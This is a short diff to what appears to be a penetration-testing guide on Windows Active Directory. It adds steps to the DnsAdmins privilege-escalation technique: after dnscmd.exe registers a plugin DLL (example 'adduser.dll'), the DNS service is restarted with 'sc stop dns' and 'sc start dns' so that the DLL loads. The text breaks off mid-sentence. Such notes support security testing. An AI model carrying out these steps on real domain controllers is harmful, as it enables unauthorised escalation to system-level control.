@@ -133,3 +133,13 @@ dnscmd.exe /config /serverlevelplugindll <fullpathtodll>
 #Example
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 ```
+
+Next, we need to restart the dns service:
+```
+sc stop dns
+sc start dns
+```
+
+Sometimes, the user may not have permission to perform restart, then we would have to wait for it to somehow be restarted.
+
+For cleaning up or utilizing DnsAdmin to add a WPAD
